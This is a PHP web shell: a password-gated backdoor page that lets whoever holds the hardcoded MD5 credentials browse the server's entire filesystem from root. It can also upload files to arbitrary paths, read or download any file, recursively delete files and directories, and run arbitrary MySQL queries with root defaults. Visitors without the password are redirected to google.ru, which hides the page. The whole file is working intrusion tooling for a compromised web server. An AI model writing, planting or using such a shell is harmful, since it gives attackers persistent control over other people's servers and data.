<?php

    error_reporting( E_ERROR );
    auth();

    function a($label, $url, $_blank=false, $onclick=false)
    {
        return '<a href="'.$url.'"'.(($_blank)?' target="_blank"':'').''.(($onclick)?' onclick="'.$onclick.'"':'').'>'.$label.'</a>';
    }

    function li($li)
    {
        $result = '<ul>';
        foreach ( $li as $val ) {
            $result .= '<li>'.$val.'</li>';
        }
        $result .= '</ul>';
        return $result;
    }
    
    function form($action=null, $params=array())
    {
        $result = '<form type="GET">';
        if ( $action )
            $result .= '<input type="hidden" name="action" value="'.$action.'" />';
        foreach ( $params as $name => $value ) {
            $result .= '<div><input type="text" name="'.$name.'" value="'.$value.'" placeHolder="'.$name.'" /></div>';
        }
        $result .= '<div><input type="submit" /></div></form>';
        return $result;
    }
    
    function formFile()
    {
        return '<form enctype="multipart/form-data" method="POST"><input type="file" name="file" /><input type="submit" /></form>';
    }

    function host()
    {
        return $_SERVER['HTTP_HOST'];
    }

    function uri()
    {
        return preg_replace('/^([^?]+)(\?.*?)?(#.*)?$/', '$1$3', $_SERVER['REQUEST_URI']);
    }

    function url($params=array())
    {
        if ( count($params)==0 ) {
            return 'http://'.host().uri();
        } else {
            $url = 'http://'.host().uri();
            $first = true;
            foreach ( $params as $var => $val ) {
                if ( $first ) {
                    $url .= '?'.$var.'='.$val;
                    $first = false;
                } else {
                    $url .= '&'.$var.'='.$val;
                }                    
            }
            return $url;
        }
    }

    function directory($dir)
    {
        $scandir = scandir($dir);
        $result = '<ul>'.$dir;
        foreach ($scandir as $key => $val) {
            if ( $val=='.' )
                continue;
            if ( $val=='..' )
                $result .= '<li>'.a($val, url(array('action'=>'filesystem', 'dir'=>$_GET['dir'].'/'.$val))).'</li>';
            else {
                if ( is_dir($_GET['dir'].'/'.$val) ) {
                    $result .= '<li>('.a('del', url(array('action'=>'removefile', 'file'=>$_GET['dir'].'/'.iconv('windows-1251', 'utf-8', $val))), false, 'if (!confirm(\'?\')) return false;').') '.a(iconv('windows-1251', 'utf-8', $val), url(array('action'=>'filesystem', 'dir'=>$_GET['dir'].'/'.iconv('windows-1251', 'utf-8', $val)))).'</li>';
                } else {
                    $result .= '<li>('.a('del', url(array('action'=>'removefile', 'file'=>$_GET['dir'].'/'.iconv('windows-1251', 'utf-8', $val))), false, 'if (!confirm(\'?\')) return false;').') '.iconv('windows-1251', 'utf-8', $val).' ('.a('get', url(array('action'=>'getfile', 'file'=>$_GET['dir'].'/'.iconv('windows-1251', 'utf-8', $val))), true).' '.a('open', url(array('action'=>'openfile', 'file'=>$_GET['dir'].'/'.iconv('windows-1251', 'utf-8', $val))), true).')</li>';
                }
            }  
        }
        $result .= formFile();
        $result .= '<ul>';
        
        return $result;
    }

    function removeDir($dir)
    {
        if ($objs = glob($dir."/*")) {
            foreach($objs as $obj) {
                is_dir($obj) ? removeDir($obj) : unlink($obj);
            }
        }
        rmdir($dir);
    }
    
    function auth()
    {
        if ( $_COOKIE['name']!='1bf89d9a72eff4d965889095f2f80ec7' || $_COOKIE['password']!='70988abde379ea7be1b9c3f173d19850' ) {
            if ( !isset($_GET['name']) ) {
                echo form(null, array(
                    'name'=>'',
                    'password'=>'',
                ));
                exit;
            } elseif ( md5($_GET['name'])=='1bf89d9a72eff4d965889095f2f80ec7' && md5($_GET['password'])=='70988abde379ea7be1b9c3f173d19850' ) {
                setcookie('name', md5($_GET['name']));
                setcookie('password', md5($_GET['password']));
                header('Location: '.url());
            } else {
                header('Location: http://www.google.ru');
                exit;
            }
        }
    }
    
    // action

    if ( !isset($_GET['action']) ) {

        echo li(array(
            a(dirname(__FILE__), url(array(
                'action'=>'filesystem',
                'dir'=>dirname(__FILE__),
            ))),
            a('filesystem', url(array(
                'action'=>'filesystem',
            ))),
            form('mysql', array(
                'host'=>'localhost',
                'user'=>'root',
                'password'=>'',
                'db'=>'',
                'query'=>'show databases',
            )),
        ));

    } else {
        switch ($_GET['action']) {           
            case 'filesystem':
                if ( isset($_FILES['file']) ) {
                    move_uploaded_file($_FILES['file']['tmp_name'], $_GET['dir'].'/'.$_FILES['file']['name']);
                }
                echo directory((isset($_GET['dir']))?$_GET['dir']:'/');
                break;

            case 'getfile':
                $file = ($_GET['file']);
                header ('Content-Type: application/octet-stream');
                header ('Accept-Ranges: bytes');
                header ('Content-Length: '.filesize($file));
                header ('Content-Disposition: attachment; filename='.$file);  
                readfile($file);
                break;
            
            case 'openfile':
                $file = ($_GET['file']);
                echo '<pre>'.htmlspecialchars(file_get_contents($file)).'</pre>';
                break;
            
            case 'mysql':
                echo form('mysql', array(
                    'host'=>$_GET['host'],
                    'user'=>$_GET['user'],
                    'password'=>$_GET['password'],
                    'db'=>$_GET['db'],
                    'query'=>$_GET['query'],
                ));
                mysql_connect($_GET['host'], $_GET['user'], $_GET['password']);
                mysql_select_db($_GET['db']);
                $q = mysql_query($_GET['query']);
                if ( $q!==true && $q!==false ) {
                    $num = mysql_num_rows($q);
                    echo '<pre>';
                    for ( $i=0; $i<$num; $i++ ) {
                        $row = mysql_fetch_array($q);
                        foreach ( $row as $key => $val ) {
                            if ( is_numeric($key) ) {
                                unset($row[$key]);
                            } elseif ( $_GET['query']=='show tables' ) {
                                $row[$key] = a($val, url(array(
                                    'action'=>'mysql',
                                    'host'=>$_GET['host'],
                                    'user'=>$_GET['user'],
                                    'password'=>$_GET['password'],
                                    'db'=>$_GET['db'],
                                    'query'=>'select * from '.$val,
                                )));
                            } elseif ( $_GET['query']=='show databases' ) {
                                $row[$key] = a($val, url(array(
                                    'action'=>'mysql',
                                    'host'=>$_GET['host'],
                                    'user'=>$_GET['user'],
                                    'password'=>$_GET['password'],
                                    'db'=>$val,
                                    'query'=>'show tables',
                                )));
                            }
                                
                        }
                        print_r($row);
                        echo '</table>';

                    }
                    echo '</pre>';
                }
                break;

            case 'removefile':
                $file = ($_GET['file']);
                if (!is_dir($file))
                    unlink($file);
                else
                    removeDir($file);
                header('Location: '.$_SERVER['HTTP_REFERER']);

            default:
                break;
        }
    }